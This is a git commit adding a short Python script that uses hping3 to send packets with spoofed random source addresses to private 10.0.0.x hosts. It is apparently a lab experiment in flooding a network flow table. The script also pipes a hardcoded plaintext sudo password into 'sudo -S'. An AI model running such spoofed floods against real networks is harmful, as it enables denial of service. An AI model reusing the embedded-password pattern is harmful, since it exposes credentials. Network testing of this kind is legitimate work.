b4d5839fd5f6190f1b0d7fb580c9c7f562f58c2f
Ante Skoric <ante.skoric@haw-hamburg.de>
2020-11-23 14:32:43 +0100

    Added flood_table script

---
+++ flood_table.py
@@ -0,0 +1,17 @@
+import os
+import random as rm
+#import socket
+#import struct
+
+call_size = 500
+packages = "1"
+data_size = "5"
+dest_ips = ["10.0.0.1", "10.0.0.2", "10.0.0.3", "10.0.0.4", "10.0.0.5", "10.0.0.6", "10.0.0.8", "10.0.0.18", "10.0.0.42", "10.0.0.43",
+       "10.0.0.44"]
+sudoPassword = 'pmthtsfk'
+
+for x in range(0, call_size):
+    position = rm.randint(0, 10)
+    dest_ip = dest_ips[position]
+    #random_src_ip = socket.inet_ntoa(struct.pack('>I', rm.randint(1, 0xffffffff)))
+    os.system('echo %s|sudo -S %s' % (sudoPassword, "hping3 -c " + packages + " -p 7 " + "-d " + data_size + " --rand-source " + " " + dest_ip))
